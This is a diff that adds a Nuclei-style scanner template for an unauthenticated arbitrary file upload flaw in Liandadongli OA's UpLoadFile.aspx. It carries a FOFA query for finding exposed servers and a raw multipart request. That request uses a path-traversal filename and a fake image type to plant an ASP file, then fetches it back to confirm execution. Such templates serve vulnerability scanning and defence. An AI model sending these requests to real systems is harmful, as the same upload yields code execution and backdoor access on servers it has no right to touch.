@@ -1,0 +1,48 @@
+id: liandadongliOA-UpLoadFile_aspx-File-upload
+
+info:
+  name: 联达动力OA UpLoadFile.aspx 任意文件上传漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: (body="/LKSys_WindowControlScript.js" || body="onload=\"LKSYS_PubMaxWin()" || body="id=\"lkbLogin\" href=\"javascript:__doPostBack('lkbLogin','')" || (body="IdentityValidator" && body="HHCtrlMax"))
+    联达动力OA UpLoadFile.aspx 接口处存在任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488364&idx=1&sn=c12971a0443f4d300e0123651fa99f54&chksm=c267a65ff5102f496c621f9b337140d3024fa607de7a20d88ea03eb3980c8e43105abf369dd9&token=377357801&lang=zh_CN#rd
+  tags: File upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        POST /FileManage/UpLoadFile.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+        Content-Type: multipart/form-data; boundary=d0b7a0d40eed0e32904c8017b09eb305
+
+        --d0b7a0d40eed0e32904c8017b09eb305
+        Content-Disposition: form-data; name="DesignId"
+        
+        1
+        --d0b7a0d40eed0e32904c8017b09eb305
+        Content-Disposition: form-data; name="file"; filename="../{{username}}.asp"
+        Content-Type: image/png
+
+        
+        <% Response.Write("pboyjnnrfipmplsukdeczudsefxmywe") %>
+        --d0b7a0d40eed0e32904c8017b09eb305--
+  - raw:
+      - |
+        GET /FileManage/{{username}}.asp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'pboyjnnrfipmplsukdeczudsefxmywe'
+      - type: status
+        status: 
+          - 200
